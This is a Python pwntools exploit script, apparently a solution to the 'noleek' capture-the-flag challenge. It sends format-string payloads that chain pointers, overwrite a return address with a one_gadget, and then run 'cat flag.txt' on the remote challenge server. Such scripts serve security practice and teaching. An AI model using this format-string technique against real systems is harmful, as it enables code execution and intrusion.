#!/usr/bin/env python3
# -*- coding: utf-8 -*-


from pwn import *

elf = context.binary = ELF('noleek', checksec=False)
context.terminal = ["terminator", "-u", "-e"]
# context.terminal = ["remotinator", "vsplit", "-x"]


def get_conn(argv=[], *a, **kw):
	host = args.HOST or 'challs.actf.co'
	port = int(args.PORT or 31400)
	if args.GDB:
		return gdb.debug([elf.path] + argv, gdbscript=gdbscript, env=env, *a, **kw)
	elif args.REMOTE:
		return remote(host, port)
	else:
		return process([elf.path] + argv, env=env, *a, **kw)

gdbscript = '''
# tbreak main
b *fprintf+145
continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
env = {}

io = get_conn()
r = lambda x: io.recv(x)
rl = lambda: io.recvline(keepends=False)
ru = lambda x: io.recvuntil(x, drop=True)
cl = lambda: io.clean(timeout=1)
s = lambda x: io.send(x)
sa = lambda x, y: io.sendafter(x, y)
sl = lambda x: io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
ia = lambda: io.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)


# ptr chain + overwrite retaddr

gadgets = list(map(int, '285167 285189 471818 471835 824858 824861 824864 945514 945522 945527 945537'.split()))

# sla(b'leek? ', b'%16$llx')
# ia()
sla(b'leek? ', f'%1$*1$c%56c%13$n'.encode())

offset = 0x23d0a
needed_bytes = gadgets[int(args.X) or 0] - offset
# li(f'Need {needed_bytes:#x} more bytes') 
sla(b'more leek? ', f'%*12$c%{needed_bytes}c%42$n'.encode())

sla(b'noleek.', b'cat flag.txt')
print(cl())
